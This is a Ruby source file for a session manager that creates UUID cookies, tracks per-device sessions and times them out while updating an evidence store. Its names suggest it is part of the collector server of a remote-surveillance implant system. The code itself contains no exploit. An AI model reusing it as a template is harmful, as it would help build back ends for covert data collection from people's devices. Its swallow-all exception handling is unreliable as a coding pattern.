#
#  Session Manager, manages all the cookies
#

require_relative 'evidence_manager'
require_relative 'sync_stat'

# from RCS::Common
require 'rcs-common/trace'

# system
require 'uuidtools'

module RCS
module Collector

class SessionManager
  include Singleton
  include RCS::Tracer

  def initialize
    @semaphore = Mutex.new
    @sessions = {}
  end

  def create(bid, ident, instance, platform, demo, level, k, ip)

    # create a new random cookie
    #cookie = SecureRandom.random_bytes(8).unpack('H*').first
    cookie = UUIDTools::UUID.random_create.to_s

    # backward compatibility fix because SYMBIAN 7.x has an internal buffer of 32 chars
    # Giovanna owes me a beer... :)
    cookie = cookie.slice(0..25) if platform == 'SYMBIAN'

    # store the sessions
    @semaphore.synchronize do
      @sessions[cookie] = {:bid => bid,
                           :ident => ident,
                           :instance => instance,
                           :platform => platform,
                           :demo => demo,
                           :level => level,
                           :key => k,
                           :cookie => cookie,
                           :ip => ip,
                           :time => Time.now,
                           :sync_stat => SyncStat.new,
                           :count => 0,
                           :total => 0}
    end

    return cookie
  end

  def guid_from_cookie(cookie)
    # this will match our GUID session cookie
    re = '.*?(ID=)([A-Z0-9]{8}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{12})'
    m = Regexp.new(re, Regexp::IGNORECASE).match(cookie)

    # we have to check for shorter cookie for backward compatibility SYMBIAN 7.x
    # see above in the cookie creation
    if m.nil?
      re = '.*?(ID=)([A-Z0-9]{8}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{2})'
      m = Regexp.new(re, Regexp::IGNORECASE).match(cookie)
    end

    return m.nil? ? m : m[2]
  end

  def check(cookie)
    return false if @sessions[cookie].nil?

    # update the time of the session (to avoid timeout)
    @semaphore.synchronize do
      @sessions[cookie][:time] = Time.now
    end
    
    return true
  end

  def get(cookie)
    return @sessions[cookie]
  end

  def delete(cookie)
    @semaphore.synchronize do
      @sessions.delete(cookie)
    end
  end

  # default timeout is 2 hours
  # this timeout is calculated from the last time the cookie was
  # checked, it will fail during a sync only if a request (i.e. log transfer)
  # takes more than 2 hours
  def timeout(delta = 7200)
    trace :debug, "Session Manager timing out entries..." if @sessions.length > 0
    # save the size of the hash before deletion
    size = @sessions.length
    # search for timed out sessions
    @semaphore.synchronize do
      begin
        @sessions.each_pair do |key, sess|
          if Time.now - sess[:time] >= delta
            trace :info, "Session Timeout for [#{sess[:cookie]}]"

            sess[:sync_stat].timedout

            # update the status accordingly
            DB.instance.sync_timeout sess
            EvidenceManager.instance.sync_timeout sess

            # delete the entry
            @sessions.delete key
          end
        end
      rescue Exception => e
        # catch all to avoid semaphore problems
      end
    end
    trace :info, "Session Manager timed out #{size - @sessions.length} sessions" if size - @sessions.length > 0
  end

  def length
    return @sessions.length
  end
end #SessionManager

end #Collector::
end #RCS::